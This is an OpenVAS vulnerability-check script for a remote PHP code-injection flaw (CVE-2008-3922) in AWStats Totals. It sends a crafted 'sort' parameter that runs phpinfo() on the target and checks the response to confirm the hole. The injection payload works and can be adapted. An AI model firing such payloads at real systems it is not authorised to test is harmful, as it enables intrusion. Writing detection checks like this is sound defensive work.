###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_awstats_totals_sort_parameter_cmd_exec_vuln.nasl 13 2013-10-27 12:16:33Z jan $
#
# AWStats Totals 'sort' Parameter Remote Command Execution Vulnerabilities
#
# Authors:
# Sooraj KS <kssooraj@secpod.com>
#
# Copyright:
# Copyright (c) 2011 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

include("revisions-lib.inc");
tag_impact = "Successful exploitation could allow remote attackers to execute arbitrary PHP
  commands by constructing specially crafted 'sort' parameters.
  Impact Level: Application";
tag_affected = "AWStats Totals versions 1.14 and prior.";
tag_insight = "The flaw is caused by improper validation of user-supplied input passed via
  the 'sort' parameter to 'multisort()' function, which allows attackers to
  execute arbitrary PHP code.";
tag_solution = "Upgrade to AWStats Totals version 1.15 or later.
  For updates refer to http://www.telartis.nl/xcms/awstats/";
tag_summary = "This host is running AWStats Totals and is prone to remote command
  execution vulnerabilites.";

if(description)
{
  script_id(801893);
  script_version("$Revision: 13 $");
  script_tag(name:"last_modification", value:"$Date: 2013-10-27 13:16:33 +0100 (Sun, 27 Oct 2013) $");
  script_tag(name:"creation_date", value:"2011-06-07 13:29:28 +0200 (Tue, 07 Jun 2011)");
  script_cve_id("CVE-2008-3922");
  script_bugtraq_id(30856);
  script_tag(name:"cvss_base", value:"9.3");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:C/I:C/A:C");
  script_tag(name:"risk_factor", value:"Critical");
  script_name("AWStats Totals 'sort' Parameter Remote Command Execution Vulnerabilities");
  desc = "
  Summary:
  " + tag_summary + "

  Vulnerability Insight:
  " + tag_insight + "

  Impact:
  " + tag_impact + "

  Affected Software/OS:
  " + tag_affected + "

  Solution:
  " + tag_solution;
  script_xref(name : "URL" , value : "http://xforce.iss.net/xforce/xfdb/44712");
  script_xref(name : "URL" , value : "http://www.exploit-db.com/exploits/17324/");
  script_xref(name : "URL" , value : "http://www.securityfocus.com/archive/1/archive/1/495770/100/0/threaded");
  script_xref(name : "URL" , value : "http://packetstormsecurity.org/files/view/101698/awstatstotals_multisort.rb.txt");

  script_description(desc);
  script_summary("Check if AWStats Totals is prone to remote command execution vulnerability");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2011 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("http_version.nasl");
  script_require_ports("Services/www", 80);
  if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
    script_tag(name : "impact" , value : tag_impact);
    script_tag(name : "affected" , value : tag_affected);
    script_tag(name : "insight" , value : tag_insight);
    script_tag(name : "solution" , value : tag_solution);
    script_tag(name : "summary" , value : tag_summary);
  }
  exit(0);
}


include("http_func.inc");
include("http_keepalive.inc");

## Get HTTP Port
port = get_http_port(default:80);
if(!get_port_state(port)) {
  exit(0);
}

## Chek Host Supports PHP
if(!can_host_php(port:port)) {
  exit(0);
}

foreach dir (make_list("/awstatstotals", "/awstats", cgi_dirs()))
{
  ## Send and Recieve the response
  sndReq = http_get(item:string(dir, "/awstatstotals.php"), port:port);
  rcvRes = http_keepalive_send_recv(port:port, data:sndReq);

  ## Confirm the application
  if("<title>AWStats Totals</title>" >< rcvRes)
  {
    ## Construct attack request
    url = string(dir, '/awstatstotals.php?sort="].phpinfo().exit().%24a["');

    ## Confirm exploit worked by checking the response
    if(http_vuln_check(port:port, url:url, pattern:'>phpinfo()<',
       extra_check: make_list('>System <', '>Configuration<', '>PHP Core<')))
    {
      security_hole(port);
      exit(0);
    }
  }
}
